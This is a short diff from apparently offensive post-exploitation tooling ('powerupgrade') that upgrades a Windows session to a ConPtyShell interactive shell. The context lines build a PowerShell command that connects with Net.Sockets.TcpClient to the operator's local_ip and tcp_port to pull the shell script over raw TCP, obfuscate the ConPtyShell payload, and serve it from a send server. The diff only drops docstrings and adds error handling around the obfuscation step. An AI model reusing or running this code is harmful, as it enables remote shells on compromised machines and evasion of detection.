@@ -26,7 +26,6 @@ _CONPTY_POLL_SLEEP = 0.1
 def _build_invoke_cmd(
     local_ip: str, tcp_port: int, callback_port: int, rows: int, cols: int, conpty_fn: str
 ) -> str:
-    """Build ConPtyShell invoke command that fetches script via TCP (no HTTP)."""
     inner = (
         f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{tcp_port});"
         f"$_s=$_c.GetStream();"
@@ -75,7 +74,11 @@ def upgrade_windows_conptyshell(
     else:
         notify('info', "ConPtyShell fetched from remote")
 
-    ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
+    try:
+        ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
+    except ValueError as exc:
+        notify('error', f"Cannot prepare ConPtyShell: {exc}")
+        return
 
     tcp_port, thread, errors = spawn_send_server(
         ps1_data, timeout=_TCP_SERVER_TIMEOUT, expected_ip=sess.addr[0]
@@ -153,7 +156,6 @@ def _wait_for_new_session(
 
 
 def get_external_resources() -> list[dict]:
-    """Return external resources needed by powerupgrade."""
     return [
         {
             "name": "ConPtyShell",
